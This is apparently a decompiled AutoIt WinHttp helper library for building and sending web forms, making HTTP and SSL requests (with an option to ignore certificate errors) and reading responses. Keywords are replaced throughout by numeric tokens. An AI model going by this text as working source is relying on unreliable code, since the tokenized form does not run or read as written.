28$ASPLIT,$SBOUNDARY,$SPASSEDID,$SPASSEDDATA,$INUMREPL,$FMULTIPART=40,$SSUBMIT,$SRADIO,$SCHECKBOX,$SBUTTON
28$SGRSEP=28(29),$IERR
28$AINPUTIDS[4][369($AINPUT)]
23$SENCTYPE
21"","application/x-www-form-urlencoded","text/plain"
13$I=015369($AINPUT)-1
__WINHTTPFORMATTRIB($AINPUTIDS,$I,$AINPUT[$I])
4$AINPUTIDS[1][$I]5
$AINPUTIDS[1][$I]=__WINHTTPURLENCODE(328($AINPUTIDS[1][$I],$SSPR1," "),$SENCTYPE)
$AINPUTIDS[2][$I]=__WINHTTPURLENCODE(328(328($AINPUTIDS[2][$I],$SSPR2,">"),$SSPR1," "),$SENCTYPE)
$SADDDATA&=$AINPUTIDS[1][$I]&"="&$AINPUTIDS[2][$I]&"&"
4$AINPUTIDS[3][$I]="submit"5$SSUBMIT&=$AINPUTIDS[1][$I]&"="&$AINPUTIDS[2][$I]&$SGRSEP
4$AINPUTIDS[3][$I]="radio"5$SRADIO&=$AINPUTIDS[1][$I]&"="&$AINPUTIDS[2][$I]&$SGRSEP
4$AINPUTIDS[3][$I]="checkbox"5$SCHECKBOX&=$AINPUTIDS[1][$I]&"="&$AINPUTIDS[2][$I]&$SGRSEP
4$AINPUTIDS[3][$I]="button"5$SBUTTON&=$AINPUTIDS[1][$I]&"="&$AINPUTIDS[2][$I]&$SGRSEP
8
14
$SSUBMIT=337($SSUBMIT,1)
$SRADIO=337($SRADIO,1)
$SCHECKBOX=337($SCHECKBOX,1)
$SBUTTON=337($SBUTTON,1)
$SADDDATA=337($SADDDATA,1)
13$K=115$INUMPARAMS
$SPASSEDDATA=__WINHTTPURLENCODE($ADTAS[$K],$SENCTYPE)
$ADTAS[$K]=0
$SPASSEDID=$AFLDS[$K]
$AFLDS[$K]=0
$ASPLIT=331($SPASSEDID,":",2)
$IERR=@ERROR
$ASPLIT[0]=__WINHTTPURLENCODE($ASPLIT[0],$SENCTYPE)
43$IERR5$ASPLIT[1]=__WINHTTPURLENCODE($ASPLIT[1],$SENCTYPE)
4$IERR2$ASPLIT[0]<>"name"5
43$IERR1$ASPLIT[0]="id"5$SPASSEDID=$ASPLIT[1]
13$J=015369($AINPUTIDS,2)-1
4$AINPUTIDS[0][$J]=$SPASSEDID5
4$AINPUTIDS[3][$J]="submit"5
4$SPASSEDDATA=395
4$SSUBMIT5
28$FDELID=40
13$SCHUNKSUB17331($SSUBMIT,$SGRSEP,3)
4$SCHUNKSUB==$AINPUTIDS[1][$J]&"="&$AINPUTIDS[2][$J]5
4$FDELID5$SADDDATA=327($SADDDATA,"(?:&|\A)\Q"&$SCHUNKSUB&"\E(?:&|\Z)","&",1)
$FDELID=39
6
$SADDDATA=327($SADDDATA,"(?:&|\A)\Q"&$SCHUNKSUB&"\E(?:&|\Z)","&")
8
__WINHTTPTRIMBOUNDS($SADDDATA,"&")
14
$SSUBMIT=""
8
8
7$AINPUTIDS[3][$J]="radio"5
4$SPASSEDDATA=$AINPUTIDS[2][$J]5
13$SCHUNKSUB17331($SRADIO,$SGRSEP,3)
4$SCHUNKSUB==$AINPUTIDS[1][$J]&"="&$SPASSEDDATA5
$SADDDATA=327(328($SADDDATA,"&","&&"),"(?:&|\A)\Q"&$AINPUTIDS[1][$J]&"\E(.*?)(?:&|\Z)","&")
$SADDDATA=328(328($SADDDATA,"&&","&"),"&&","&")
4322($SADDDATA,1)="&"5$SADDDATA=336($SADDDATA,1)
$SADDDATA&="&"&$SCHUNKSUB
$SRADIO=327(328($SRADIO,$SGRSEP,$SGRSEP&$SGRSEP),"(?:"&$SGRSEP&"|\A)\Q"&$AINPUTIDS[1][$J]&"\E(.*?)(?:"&$SGRSEP&"|\Z)",$SGRSEP)
$SRADIO=328(328($SRADIO,$SGRSEP&$SGRSEP,$SGRSEP),$SGRSEP&$SGRSEP,$SGRSEP)
8
14
8
7$AINPUTIDS[3][$J]="checkbox"5
$SCHECKBOX=327($SCHECKBOX,"\Q"&$AINPUTIDS[1][$J]&"="&$SPASSEDDATA&"\E"&$SGRSEP&"*","")
__WINHTTPTRIMBOUNDS($SCHECKBOX,$SGRSEP)
7$AINPUTIDS[3][$J]="button"5
$SBUTTON=327($SBUTTON,"\Q"&$AINPUTIDS[1][$J]&"="&$SPASSEDDATA&"\E"&$SGRSEP&"*","")
__WINHTTPTRIMBOUNDS($SBUTTON,$SGRSEP)
6
$SADDDATA=327(328($SADDDATA,"&","&&"),"(?:&|\A)\Q"&$AINPUTIDS[1][$J]&"="&$AINPUTIDS[2][$J]&"\E(?:&|\Z)","&"&$AINPUTIDS[1][$J]&"="&$SPASSEDDATA&"&")
$INUMREPL=@EXTENDED
$SADDDATA=328($SADDDATA,"&&","&")
4$INUMREPL>15
$SADDDATA=327($SADDDATA,"(?:&|\A)\Q"&$AINPUTIDS[1][$J]&"\E=.*?(?:&|\Z)","&",$INUMREPL-1)
8
__WINHTTPTRIMBOUNDS($SADDDATA,"&")
8
8
14
6
13$J=015369($AINPUTIDS,2)-1
4$AINPUTIDS[3][$J]="submit"5
4$SPASSEDDATA=395
4$AINPUTIDS[1][$J]==$ASPLIT[1]5
4$SSUBMIT5
28$FDEL=40
13$SCHUNKSUB17331($SSUBMIT,$SGRSEP,3)
4$SCHUNKSUB=$AINPUTIDS[1][$J]&"="&$AINPUTIDS[2][$J]5
4$FDEL5$SADDDATA=327($SADDDATA,"(?:&|\A)\Q"&$SCHUNKSUB&"\E(?:&|\Z)","&",1)
$FDEL=39
6
$SADDDATA=327($SADDDATA,"(?:&|\A)\Q"&$SCHUNKSUB&"\E(?:&|\Z)","&")
8
__WINHTTPTRIMBOUNDS($SADDDATA,"&")
14
$SSUBMIT=""
8
192
8
6
192
8
7$AINPUTIDS[1][$J]==$ASPLIT[1]1$AINPUTIDS[3][$J]="radio"5
13$SCHUNKSUB17331($SRADIO,$SGRSEP,3)
4$SCHUNKSUB==$AINPUTIDS[1][$J]&"="&$SPASSEDDATA5
$SADDDATA=328(328(327(328($SADDDATA,"&","&&"),"(?:&|\A)\Q"&$AINPUTIDS[1][$J]&"\E(.*?)(?:&|\Z)","&"),"&&","&"),"&&","&")
4322($SADDDATA,1)="&"5$SADDDATA=336($SADDDATA,1)
$SADDDATA&="&"&$SCHUNKSUB
$SRADIO=327(328($SRADIO,$SGRSEP,$SGRSEP&$SGRSEP),"(?:"&$SGRSEP&"|\A)\Q"&$AINPUTIDS[1][$J]&"\E(.*?)(?:"&$SGRSEP&"|\Z)",$SGRSEP)
$SRADIO=328(328($SRADIO,$SGRSEP&$SGRSEP,$SGRSEP),$SGRSEP&$SGRSEP,$SGRSEP)
8
14
192
7$AINPUTIDS[1][$J]==$ASPLIT[1]1$AINPUTIDS[3][$J]="checkbox"5
$SCHECKBOX=327($SCHECKBOX,"\Q"&$AINPUTIDS[1][$J]&"="&$SPASSEDDATA&"\E"&$SGRSEP&"*","")
__WINHTTPTRIMBOUNDS($SCHECKBOX,$SGRSEP)
192
7$AINPUTIDS[1][$J]==$ASPLIT[1]1$AINPUTIDS[3][$J]="button"5
$SBUTTON=327($SBUTTON,"\Q"&$AINPUTIDS[1][$J]&"="&$SPASSEDDATA&"\E"&$SGRSEP&"*","")
__WINHTTPTRIMBOUNDS($SBUTTON,$SGRSEP)
192
8
14
$SADDDATA=327(328($SADDDATA,"&","&&"),"(?:&|\A)\Q"&$ASPLIT[1]&"\E=.*?(?:&|\Z)","&"&$ASPLIT[1]&"="&$SPASSEDDATA&"&")
$INUMREPL=@EXTENDED
$SADDDATA=328($SADDDATA,"&&","&")
4$INUMREPL>15
$SADDDATA=327($SADDDATA,"(?:&|\A)\Q"&$ASPLIT[1]&"\E=.*?(?:&|\Z)","&",$INUMREPL-1)
8
__WINHTTPTRIMBOUNDS($SADDDATA,"&")
8
14
__WINHTTPFINALIZECTRLS($SSUBMIT,$SRADIO,$SCHECKBOX,$SBUTTON,$SADDDATA,$SGRSEP,"&")
4$SMETHOD="GET"5
$SACTION&="?"&$SADDDATA
$SADDDATA=""
8
21"multipart/form-data"
4$SMETHOD="POST"5
$FMULTIPART=39
$SBOUNDARY=309("%s%.5f","----WinHttpBoundaryLine_",274(10000,99999))
28$SCDISP='Content-Disposition: form-data; name="'
13$I=015369($AINPUT)-1
__WINHTTPFORMATTRIB($AINPUTIDS,$I,$AINPUT[$I])
4$AINPUTIDS[1][$I]5
$AINPUTIDS[1][$I]=328($AINPUTIDS[1][$I],$SSPR1," ")
$AINPUTIDS[2][$I]=328(328($AINPUTIDS[2][$I],$SSPR2,">"),$SSPR1," ")
4$AINPUTIDS[3][$I]="file"5
$SADDDATA&="--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$I]&'"; filename=""'&@CRLF&@CRLF&$AINPUTIDS[2][$I]&@CRLF
6
$SADDDATA&="--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$I]&'"'&@CRLF&@CRLF&$AINPUTIDS[2][$I]&@CRLF
8
4$AINPUTIDS[3][$I]="submit"5$SSUBMIT&="--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$I]&'"'&@CRLF&@CRLF&$AINPUTIDS[2][$I]&@CRLF&$SGRSEP
4$AINPUTIDS[3][$I]="radio"5$SRADIO&="--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$I]&'"'&@CRLF&@CRLF&$AINPUTIDS[2][$I]&@CRLF&$SGRSEP
4$AINPUTIDS[3][$I]="checkbox"5$SCHECKBOX&="--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$I]&'"'&@CRLF&@CRLF&$AINPUTIDS[2][$I]&@CRLF&$SGRSEP
4$AINPUTIDS[3][$I]="button"5$SBUTTON&="--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$I]&'"'&@CRLF&@CRLF&$AINPUTIDS[2][$I]&@CRLF&$SGRSEP
8
14
$SSUBMIT=337($SSUBMIT,1)
$SRADIO=337($SRADIO,1)
$SCHECKBOX=337($SCHECKBOX,1)
$SBUTTON=337($SBUTTON,1)
$SADDDATA&="--"&$SBOUNDARY&"--"&@CRLF
13$K=115$INUMPARAMS
$SPASSEDDATA=$ADTAS[$K]
$ADTAS[$K]=0
$SPASSEDID=$AFLDS[$K]
$AFLDS[$K]=0
$ASPLIT=331($SPASSEDID,":",2)
4@ERROR2$ASPLIT[0]<>"name"5
43@ERROR1$ASPLIT[0]="id"5$SPASSEDID=$ASPLIT[1]
13$J=015369($AINPUTIDS,2)-1
4$AINPUTIDS[0][$J]=$SPASSEDID5
4$AINPUTIDS[3][$J]="file"5
$SADDDATA=328($SADDDATA,$SCDISP&$AINPUTIDS[1][$J]&'"; filename=""'&@CRLF&@CRLF&$AINPUTIDS[2][$J]&@CRLF,__WINHTTPFILECONTENT($SACCEPT,$AINPUTIDS[1][$J],$SPASSEDDATA,$SBOUNDARY),0,1)
7$AINPUTIDS[3][$J]="submit"5
4$SPASSEDDATA=395
4$SSUBMIT5
28$FMDELID=40
13$SCHUNKSUB17331($SSUBMIT,$SGRSEP,3)
4$SCHUNKSUB="--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&$AINPUTIDS[2][$J]&@CRLF5
4$FMDELID5$SADDDATA=328($SADDDATA,$SCHUNKSUB,"",1,1)
$FMDELID=39
6
$SADDDATA=328($SADDDATA,$SCHUNKSUB,"",0,1)
8
14
$SSUBMIT=""
8
8
7$AINPUTIDS[3][$J]="radio"5
4$SPASSEDDATA=$AINPUTIDS[2][$J]5
13$SCHUNKSUB17331($SRADIO,$SGRSEP,3)
4311($SCHUNKSUB,"--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&$SPASSEDDATA&@CRLF,1)5
$SADDDATA=327($SADDDATA,"\Q--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&"\E"&"(.*?)"&@CRLF,"")
$SADDDATA=328($SADDDATA,"--"&$SBOUNDARY&"--"&@CRLF,"",0,1)
$SADDDATA&=$SCHUNKSUB&"--"&$SBOUNDARY&"--"&@CRLF
$SRADIO=327($SRADIO,"\Q--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&"\E(.*?)"&@CRLF&$SGRSEP&"?","")
8
14
8
7$AINPUTIDS[3][$J]="checkbox"5
$SCHECKBOX=327($SCHECKBOX,"\Q--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&$SPASSEDDATA&@CRLF&"\E"&$SGRSEP&"*","")
4330($SCHECKBOX,1)=$SGRSEP5$SCHECKBOX=337($SCHECKBOX,1)
7$AINPUTIDS[3][$J]="button"5
$SBUTTON=327($SBUTTON,"\Q--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&$SPASSEDDATA&@CRLF&"\E"&$SGRSEP&"*","")
4330($SBUTTON,1)=$SGRSEP5$SBUTTON=337($SBUTTON,1)
6
$SADDDATA=328($SADDDATA,$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&$AINPUTIDS[2][$J]&@CRLF,$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&$SPASSEDDATA&@CRLF,0,1)
$INUMREPL=@EXTENDED
4$INUMREPL>15
$SADDDATA=327($SADDDATA,"(?s)\Q--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&"\E\r\n\r\n.*?\r\n","",$INUMREPL-1)
8
8
8
14
6
13$J=015369($AINPUTIDS,2)-1
4$AINPUTIDS[1][$J]==$ASPLIT[1]1$AINPUTIDS[3][$J]="file"5
$SADDDATA=328($SADDDATA,$SCDISP&$ASPLIT[1]&'"; filename=""'&@CRLF&@CRLF&$AINPUTIDS[2][$J]&@CRLF,__WINHTTPFILECONTENT($SACCEPT,$AINPUTIDS[1][$J],$SPASSEDDATA,$SBOUNDARY),0,1)
7$AINPUTIDS[1][$J]==$ASPLIT[1]1$AINPUTIDS[3][$J]="submit"5
4$SPASSEDDATA=395
4$SSUBMIT5
28$FMDEL=40
13$SCHUNKSUB17331($SSUBMIT,$SGRSEP,3)
4$SCHUNKSUB="--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&$AINPUTIDS[2][$J]&@CRLF5
4$FMDEL5$SADDDATA=328($SADDDATA,$SCHUNKSUB,"",1,1)
$FMDEL=39
6
$SADDDATA=328($SADDDATA,$SCHUNKSUB,"",0,1)
8
14
$SSUBMIT=""
8
192
6
192
8
7$AINPUTIDS[1][$J]==$ASPLIT[1]1$AINPUTIDS[3][$J]="radio"5
13$SCHUNKSUB17331($SRADIO,$SGRSEP,3)
4311($SCHUNKSUB,"--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&$SPASSEDDATA&@CRLF,1)5
$SADDDATA=327($SADDDATA,"\Q--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&"\E"&"(.*?)"&@CRLF,"")
$SADDDATA=328($SADDDATA,"--"&$SBOUNDARY&"--"&@CRLF,"",0,1)
$SADDDATA&=$SCHUNKSUB&"--"&$SBOUNDARY&"--"&@CRLF
$SRADIO=327($SRADIO,"\Q--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&"\E(.*?)"&@CRLF&$SGRSEP&"?","")
8
14
192
7$AINPUTIDS[1][$J]==$ASPLIT[1]1$AINPUTIDS[3][$J]="checkbox"5
$SCHECKBOX=327($SCHECKBOX,"\Q--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&$SPASSEDDATA&@CRLF&"\E"&$SGRSEP&"*","")
4330($SCHECKBOX,1)=$SGRSEP5$SCHECKBOX=337($SCHECKBOX,1)
192
7$AINPUTIDS[1][$J]==$ASPLIT[1]1$AINPUTIDS[3][$J]="button"5
$SBUTTON=327($SBUTTON,"\Q--"&$SBOUNDARY&@CRLF&$SCDISP&$AINPUTIDS[1][$J]&'"'&@CRLF&@CRLF&$SPASSEDDATA&@CRLF&"\E"&$SGRSEP&"*","")
4330($SBUTTON,1)=$SGRSEP5$SBUTTON=337($SBUTTON,1)
192
8
14
$SADDDATA=327($SADDDATA,"(?s)\Q"&$SCDISP&$ASPLIT[1]&'"'&"\E\r\n\r\n.*?\r\n",$SCDISP&$ASPLIT[1]&'"'&@CRLF&@CRLF&328($SPASSEDDATA,"\","\\")&@CRLF)
$INUMREPL=@EXTENDED
4$INUMREPL>15
$SADDDATA=327($SADDDATA,"(?s)\Q--"&$SBOUNDARY&@CRLF&$SCDISP&$ASPLIT[1]&'"'&"\E\r\n\r\n.*?\r\n","",$INUMREPL-1)
8
8
14
8
__WINHTTPFINALIZECTRLS($SSUBMIT,$SRADIO,$SCHECKBOX,$SBUTTON,$SADDDATA,$SGRSEP)
24
18
14
4$FSEND5
4$FVARFORM5
$HINTERNET=_WINHTTPCONNECT($HOPEN,$SNEWURL)
6
4$SNEWURL5
$HOPEN=_WINHTTPQUERYOPTION($HINTERNET,$WINHTTP_OPTION_PARENT_HANDLE)
_WINHTTPCLOSEHANDLE($HINTERNET)
$HINTERNET=_WINHTTPCONNECT($HOPEN,$SNEWURL)
8
8
4$SPROXY<>""5_WINHTTPSIMPLESSLREQUEST($HINTERNET,"GET","/",41,41,41,41,41,$SUSER,$SPASS,41)
28$HREQUEST
4$ISCHEME=$INTERNET_SCHEME_HTTPS5
$HREQUEST=__WINHTTPFORMSEND($HINTERNET,$SMETHOD,$SACTION,$FMULTIPART,$SBOUNDARY,$SADDDATA,39,$SADDITIONALHEADERS,$SCREDNAME,$SCREDPASS,$IIGNORECERTERR)
6
$HREQUEST=__WINHTTPFORMSEND($HINTERNET,$SMETHOD,$SACTION,$FMULTIPART,$SBOUNDARY,$SADDDATA,40,$SADDITIONALHEADERS,$SCREDNAME,$SCREDPASS)
4_WINHTTPQUERYHEADERS($HREQUEST,$WINHTTP_QUERY_STATUS_CODE)>=$HTTP_STATUS_BAD_REQUEST5
_WINHTTPCLOSEHANDLE($HREQUEST)
$HREQUEST=__WINHTTPFORMSEND($HINTERNET,$SMETHOD,$SACTION,$FMULTIPART,$SBOUNDARY,$SADDDATA,39,$SADDITIONALHEADERS,$SCREDNAME,$SCREDPASS,$IIGNORECERTERR)
8
8
28$VRETURNED=_WINHTTPSIMPLEREADDATA($HREQUEST)
4@ERROR5
_WINHTTPCLOSEHANDLE($HREQUEST)
34287(4,0,"")
8
28$ISCODE=_WINHTTPQUERYHEADERS($HREQUEST,$WINHTTP_QUERY_STATUS_CODE)
4$IRETARR5
28$ARETURN[3]=[_WINHTTPQUERYHEADERS($HREQUEST),$VRETURNED,_WINHTTPQUERYOPTION($HREQUEST,$WINHTTP_OPTION_URL)]
$VRETURNED=$ARETURN
8
_WINHTTPCLOSEHANDLE($HREQUEST)
34288($ISCODE,$VRETURNED)
8
34287(3,0,"")
33
32_WINHTTPSIMPLEFORMFILL_SETUPLOADCALLBACK($VCALLBACK=41,$INUMCHUNKS=100)
4$INUMCHUNKS<=05$INUMCHUNKS=100
2831$VFUNC=41,$IPARTS=$INUMCHUNKS
4$VCALLBACK<>415
$VFUNC=$VCALLBACK
$IPARTS=27($INUMCHUNKS)
7$VCALLBACK=05
$VFUNC=41
$IPARTS=1
8
28$AOUT[2]=[$VFUNC,$IPARTS]
34$AOUT
33
32_WINHTTPSIMPLEREADDATA($HREQUEST,$IMODE=41)
4$IMODE=415
$IMODE=0
4__WINHTTPCHARSET(_WINHTTPQUERYHEADERS($HREQUEST,$WINHTTP_QUERY_CONTENT_TYPE))=650015$IMODE=1
6
__WINHTTPDEFAULT($IMODE,0)
8
4$IMODE>22$IMODE<0534287(1,0,"")
28$VDATA=13("")
4_WINHTTPQUERYDATAAVAILABLE($HREQUEST)5
11
$VDATA&=_WINHTTPREADDATA($HREQUEST,2)
12@ERROR
23$IMODE
210
3416($VDATA)
211
3416($VDATA,4)
216
34$VDATA
24
8
34287(2,0,$VDATA)
33
32_WINHTTPSIMPLEREADDATAASYNC($HINTERNET,36$PBUFFER,$INUMBEROFBYTESTOREAD=41)
__WINHTTPDEFAULT($INUMBEROFBYTESTOREAD,8192)
28$VOUT=_WINHTTPREADDATA($HINTERNET,2,$INUMBEROFBYTESTOREAD,$PBUFFER)
34287(@ERROR,@EXTENDED,$VOUT)
33
32_WINHTTPSIMPLEREQUEST($HCONNECT,$STYPE=41,$SPATH=41,$SREFERRER=41,$SDTA=41,$SHEADER=41,$FGETHEADERS=41,$IMODE=41,$SCREDNAME=41,$SCREDPASS=41)
__WINHTTPDEFAULT($STYPE,"GET")
__WINHTTPDEFAULT($SPATH,"")
__WINHTTPDEFAULT($SREFERRER,$WINHTTP_NO_REFERER)
__WINHTTPDEFAULT($SDTA,$WINHTTP_NO_REQUEST_DATA)
__WINHTTPDEFAULT($SHEADER,$WINHTTP_NO_ADDITIONAL_HEADERS)
__WINHTTPDEFAULT($FGETHEADERS,40)
__WINHTTPDEFAULT($IMODE,41)
__WINHTTPDEFAULT($SCREDNAME,"")
__WINHTTPDEFAULT($SCREDPASS,"")
4$IMODE>22$IMODE<0534287(4,0,0)
28$HREQUEST=_WINHTTPSIMPLESENDREQUEST($HCONNECT,$STYPE,$SPATH,$SREFERRER,$SDTA,$SHEADER)
4@ERROR534287(@ERROR,0,0)
__WINHTTPSETCREDENTIALS($HREQUEST,$SHEADER,$SDTA,$SCREDNAME,$SCREDPASS)
28$IEXTENDED=_WINHTTPQUERYHEADERS($HREQUEST,$WINHTTP_QUERY_STATUS_CODE)
4$FGETHEADERS5
28$ADATA[3]=[_WINHTTPQUERYHEADERS($HREQUEST),_WINHTTPSIMPLEREADDATA($HREQUEST,$IMODE),_WINHTTPQUERYOPTION($HREQUEST,$WINHTTP_OPTION_URL)]
_WINHTTPCLOSEHANDLE($HREQUEST)
34288($IEXTENDED,$ADATA)
8
28$SOUTDATA=_WINHTTPSIMPLEREADDATA($HREQUEST,$IMODE)
_WINHTTPCLOSEHANDLE($HREQUEST)
34288($IEXTENDED,$SOUTDATA)
33
32_WINHTTPSIMPLESENDREQUEST($HCONNECT,$STYPE=41,$SPATH=41,$SREFERRER=41,$SDTA=41,$SHEADER=41)
__WINHTTPDEFAULT($STYPE,"GET")
__WINHTTPDEFAULT($SPATH,"")
__WINHTTPDEFAULT($SREFERRER,$WINHTTP_NO_REFERER)
__WINHTTPDEFAULT($SDTA,$WINHTTP_NO_REQUEST_DATA)
__WINHTTPDEFAULT($SHEADER,$WINHTTP_NO_ADDITIONAL_HEADERS)
28$HREQUEST=_WINHTTPOPENREQUEST($HCONNECT,$STYPE,$SPATH,41,$SREFERRER)
43$HREQUEST534287(1,@ERROR,0)
4$STYPE="POST"1$SHEADER=$WINHTTP_NO_ADDITIONAL_HEADERS5$SHEADER="Content-Type: application/x-www-form-urlencoded"&@CRLF
_WINHTTPSETOPTION($HREQUEST,$WINHTTP_OPTION_DECOMPRESSION,$WINHTTP_DECOMPRESSION_FLAG_ALL)
_WINHTTPSETOPTION($HREQUEST,$WINHTTP_OPTION_UNSAFE_HEADER_PARSING,1)
_WINHTTPSENDREQUEST($HREQUEST,$SHEADER,$SDTA)
4@ERROR534287(2,0*_WINHTTPCLOSEHANDLE($HREQUEST),0)
_WINHTTPRECEIVERESPONSE($HREQUEST)
4@ERROR534287(3,0*_WINHTTPCLOSEHANDLE($HREQUEST),0)
34$HREQUEST
33
32_WINHTTPSIMPLESENDSSLREQUEST($HCONNECT,$STYPE=41,$SPATH=41,$SREFERRER=41,$SDTA=41,$SHEADER=41,$IIGNOREALLCERTERRORS=0)
__WINHTTPDEFAULT($STYPE,"GET")
__WINHTTPDEFAULT($SPATH,"")
__WINHTTPDEFAULT($SREFERRER,$WINHTTP_NO_REFERER)
__WINHTTPDEFAULT($SDTA,$WINHTTP_NO_REQUEST_DATA)
__WINHTTPDEFAULT($SHEADER,$WINHTTP_NO_ADDITIONAL_HEADERS)
28$HREQUEST=_WINHTTPOPENREQUEST($HCONNECT,$STYPE,$SPATH,41,$SREFERRER,41,19($WINHTTP_FLAG_SECURE,$WINHTTP_FLAG_ESCAPE_DISABLE))
43$HREQUEST534287(1,@ERROR,0)
4$IIGNOREALLCERTERRORS5_WINHTTPSETOPTION($HREQUEST,$WINHTTP_OPTION_SECURITY_FLAGS,19($SECURITY_FLAG_IGNORE_UNKNOWN_CA,$SECURITY_FLAG_IGNORE_CERT_DATE_INVALID,$SECURITY_FLAG_IGNORE_CERT_CN_INVALID,$SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE))
4$STYPE="POST"1$SHEADER=$WINHTTP_NO_ADDITIONAL_HEADERS5$SHEADER="Content-Type: application/x-www-form-urlencoded"&@CRLF
_WINHTTPSETOPTION($HREQUEST,$WINHTTP_OPTION_DECOMPRESSION,$WINHTTP_DECOMPRESSION_FLAG_ALL)
_WINHTTPSETOPTION($HREQUEST,$WINHTTP_OPTION_UNSAFE_HEADER_PARSING,1)
_WINHTTPSENDREQUEST($HREQUEST,$SHEADER,$SDTA)
4@ERROR534287(2,0*_WINHTTPCLOSEHANDLE($HREQUEST),0)
_WINHTTPRECEIVERESPONSE($HREQUEST)
4@ERROR534287(3,0*_WINHTTPCLOSEHANDLE($HREQUEST),0)
34$HREQUEST
33
32_WINHTTPSIMPLESSLREQUEST($HCONNECT,$STYPE=41,$SPATH=41,$SREFERRER=41,$SDTA=41,$SHEADER=41,$FGETHEADERS=41,$IMODE=41,$SCREDNAME=41,$SCREDPASS=41,$IIGNORECERTERRORS=0)
__WINHTTPDEFAULT($STYPE,"GET")
__WINHTTPDEFAULT($SPATH,"")
__WINHTTPDEFAULT($SREFERRER,$WINHTTP_NO_REFERER)
__WINHTTPDEFAULT($SDTA,$WINHTTP_NO_REQUEST_DATA)
__WINHTTPDEFAULT($SHEADER,$WINHTTP_NO_ADDITIONAL_HEADERS)
__WINHTTPDEFAULT($FGETHEADERS,40)
__WINHTTPDEFAULT($IMODE,41)
__WINHTTPDEFAULT($SCREDNAME,"")
__WINHTTPDEFAULT($SCREDPASS,"")
4$IMODE>22$IMODE<0534287(4,0,0)
28$HREQUEST=_WINHTTPSIMPLESENDSSLREQUEST($HCONNECT,$STYPE,$SPATH,$SREFERRER,$SDTA,$SHEADER,$IIGNORECERTERRORS)
4@ERROR534287(@ERROR,0,0)
__WINHTTPSETCREDENTIALS($HREQUEST,$SHEADER,$SDTA,$SCREDNAME,$SCREDPASS)
4$FGETHEADERS5
28$ADATA[3]=[_WINHTTPQUERYHEADERS($HREQUEST),_WINHTTPSIMPLEREADDATA($HREQUEST,$IMODE),_WINHTTPQUERYOPTION($HREQUEST,$WINHTTP_OPTION_URL)]
_WINHTTPCLOSEHANDLE($HREQUEST)
34$ADATA
8
28$SOUTDATA=_WINHTTPSIMPLEREADDATA($HREQUEST,$IMODE)
_WINHTTPCLOSEHANDLE($HREQUEST)
34$SOUTDATA
33
32_WINHTTPTIMEFROMSYSTEMTIME()
28$SYSTEMTIME=65("word Year;"&"word Month;"&"word DayOfWeek;"&"word Day;"&"word Hour;"&"word Minute;"&"word Second;"&"word Milliseconds")
58("kernel32.dll","none","GetSystemTime","struct*",$SYSTEMTIME)
4@ERROR534287(1,0,"")
28$TTIME=65("wchar[62]")
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpTimeFromSystemTime","struct*",$SYSTEMTIME,"struct*",$TTIME)
4@ERROR23$ACALL[0]534287(2,0,"")
3466($TTIME,1)
33
32_WINHTTPTIMETOSYSTEMTIME($SHTTPTIME)
28$SYSTEMTIME=65("word Year;"&"word Month;"&"word DayOfWeek;"&"word Day;"&"word Hour;"&"word Minute;"&"word Second;"&"word Milliseconds")
28$TTIME=65("wchar[62]")
69($TTIME,1,$SHTTPTIME)
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpTimeToSystemTime","struct*",$TTIME,"struct*",$SYSTEMTIME)
4@ERROR23$ACALL[0]534287(2,0,0)
28$ARET[8]=[66($SYSTEMTIME,"Year"),66($SYSTEMTIME,"Month"),66($SYSTEMTIME,"DayOfWeek"),66($SYSTEMTIME,"Day"),66($SYSTEMTIME,"Hour"),66($SYSTEMTIME,"Minute"),66($SYSTEMTIME,"Second"),66($SYSTEMTIME,"Milliseconds")]
34$ARET
33
32_WINHTTPWRITEDATA($HREQUEST,$VDATA,$IMODE=41)
__WINHTTPDEFAULT($IMODE,0)
28$INUMBEROFBYTESTOWRITE,$TDATA
4$IMODE=15
$INUMBEROFBYTESTOWRITE=14($VDATA)
$TDATA=65("byte["&$INUMBEROFBYTESTOWRITE&"]")
69($TDATA,1,$VDATA)
7223($VDATA)5
$INUMBEROFBYTESTOWRITE=68($VDATA)
$TDATA=$VDATA
6
$INUMBEROFBYTESTOWRITE=323($VDATA)
$TDATA=65("char["&$INUMBEROFBYTESTOWRITE+1&"]")
69($TDATA,1,$VDATA)
8
28$ACALL=58($HWINHTTPDLL__WINHTTP,"bool","WinHttpWriteData","handle",$HREQUEST,"struct*",$TDATA,"dword",$INUMBEROFBYTESTOWRITE,"dword*",0)
4@ERROR23$ACALL[0]534287(1,0,0)
34288($ACALL[4],1)
33
